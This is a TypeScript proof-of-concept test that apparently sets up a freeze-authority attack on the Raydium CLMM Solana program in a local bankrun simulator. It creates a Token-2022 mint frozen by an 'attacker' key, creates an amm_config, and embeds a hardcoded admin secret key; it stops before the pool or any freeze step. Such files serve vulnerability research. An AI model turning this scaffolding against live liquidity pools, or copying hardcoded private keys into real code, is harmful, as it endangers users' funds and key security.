import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { startAnchor } from "solana-bankrun";
import { BankrunProvider } from "anchor-bankrun";
import {
  TOKEN_2022_PROGRAM_ID,
  MINT_SIZE,
  createInitializeMint2Instruction,
} from "@solana/spl-token";
import {
  Keypair,
  SystemProgram,
  Transaction,
  PublicKey,
} from "@solana/web3.js";
import idl from "../target/idl/raydium_clmm.json";

const ADMIN_SECRET = [222,63,238,12,143,134,142,4,161,175,48,183,228,55,162,51,74,95,237,146,26,147,77,52,54,75,28,199,42,240,0,96,35,202,64,63,172,172,171,217,58,31,133,50,107,206,250,166,98,247,161,237,96,59,107,111,178,144,88,198,240,205,45,4];

describe("freeze authority poc", () => {
  it("Step 1-3: creates mint, creates amm_config, creates pool", async () => {
    const context = await startAnchor(".", [], []);
    const client = context.banksClient;
    const payer = context.payer;
    const provider = new BankrunProvider(context);
    anchor.setProvider(provider);

    const program = new Program(idl as anchor.Idl, provider);
    const admin = Keypair.fromSecretKey(Uint8Array.from(ADMIN_SECRET));
    const attacker = Keypair.generate();

    // Fund the admin keypair so it can pay for/sign the amm_config creation
    const fundTx = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: payer.publicKey,
        toPubkey: admin.publicKey,
        lamports: 5_000_000_000,
      })
    );
    const [bh1] = await client.getLatestBlockhash();
    fundTx.recentBlockhash = bh1;
    fundTx.feePayer = payer.publicKey;
    fundTx.sign(payer);
    await client.processTransaction(fundTx);
    console.log("STEP 0 PASS: admin funded");

    // === STEP 1: create Token-2022 mint with freeze_authority = attacker ===
    const mint = Keypair.generate();
    const rent = await client.getRent();
    const lamports = Number(rent.minimumBalance(BigInt(MINT_SIZE)));

    const mintTx = new Transaction();
    mintTx.add(
      SystemProgram.createAccount({
        fromPubkey: payer.publicKey,
        newAccountPubkey: mint.publicKey,
        space: MINT_SIZE,
        lamports,
        programId: TOKEN_2022_PROGRAM_ID,
      }),
      createInitializeMint2Instruction(
        mint.publicKey,
        9,
        payer.publicKey,
        attacker.publicKey,
        TOKEN_2022_PROGRAM_ID
      )
    );
    const [bh2] = await client.getLatestBlockhash();
    mintTx.recentBlockhash = bh2;
    mintTx.feePayer = payer.publicKey;
    mintTx.sign(payer, mint);
    await client.processTransaction(mintTx);
    console.log("STEP 1 PASS: Token-2022 mint created with freeze_authority = attacker:", mint.publicKey.toBase58());

    // === STEP 2: create amm_config, signed by our test admin ===
    const [ammConfig] = PublicKey.findProgramAddressSync(
      [Buffer.from("amm_config"), new anchor.BN(0).toArrayLike(Buffer, "be", 2)],
      program.programId
    );

    const createAmmConfigIx = await program.methods
      .createAmmConfig(0, 60, 500, 10000, 25000)
      .accounts({
        owner: admin.publicKey,
        ammConfig: ammConfig,
        systemProgram: SystemProgram.programId,
      })
      .instruction();

    const ammConfigTx = new Transaction().add(createAmmConfigIx);
    const [bh3] = await client.getLatestBlockhash();
    ammConfigTx.recentBlockhash = bh3;
    ammConfigTx.feePayer = admin.publicKey;
    ammConfigTx.sign(admin);
    await client.processTransaction(ammConfigTx);

    console.log("STEP 2 PASS: amm_config created at", ammConfig.toBase58());
  });
});
